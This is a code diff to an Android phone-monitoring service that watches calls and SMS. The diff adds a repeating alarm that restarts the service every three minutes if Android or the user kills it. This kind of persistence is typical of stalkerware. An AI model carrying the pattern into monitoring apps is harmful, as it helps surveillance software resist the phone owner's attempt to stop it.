@@ -1,9 +1,12 @@
 package com.monitor.phone.s0ft.phonemonitor;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.os.IBinder;
+import android.os.SystemClock;
 import android.util.Log;
 
 import java.util.Timer;
@@ -19,6 +22,17 @@ public class MainService extends Service {
 
     @Override
     public void onCreate() {
+        Log.w(AppSettings.getTAG(), "Service created");
+
+        /*Setup a repeating Alarm to respawn this service(in case process is killed by Android or by user) at a fixed interval(here, 3 minutes)*/
+        Intent intent = new Intent(this, this.getClass());
+        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 0);
+        AlarmManager alarmManager = null;
+        alarmManager = (AlarmManager) this.getSystemService(ALARM_SERVICE);
+        if (alarmManager != null) {
+            alarmManager.cancel(pendingIntent);//kill any pre-existing alarms
+            alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + AlarmManager.INTERVAL_FIFTEEN_MINUTES / 5, AlarmManager.INTERVAL_FIFTEEN_MINUTES / 5, pendingIntent);
+        }
 
         /*Setup the phone call broadcast receiver*/
         callStateBroadcastReceiver = new CallStateBroadcastReceiver();
@@ -46,7 +60,6 @@ public class MainService extends Service {
             Log.w(AppSettings.getTAG(), ise.getMessage());
         }
 
-
     }
 
     @Override
@@ -56,6 +69,7 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
+        Log.w(AppSettings.getTAG(), "Service about to be destroyed");
         unregisterReceiver(callStateBroadcastReceiver);
         unregisterReceiver(smsBroadcastReceiver);
     }
@@ -65,4 +79,5 @@ public class MainService extends Service {
         // TODO: Return the communication channel to the service.
         throw new UnsupportedOperationException("Not yet implemented");
     }
+
 }
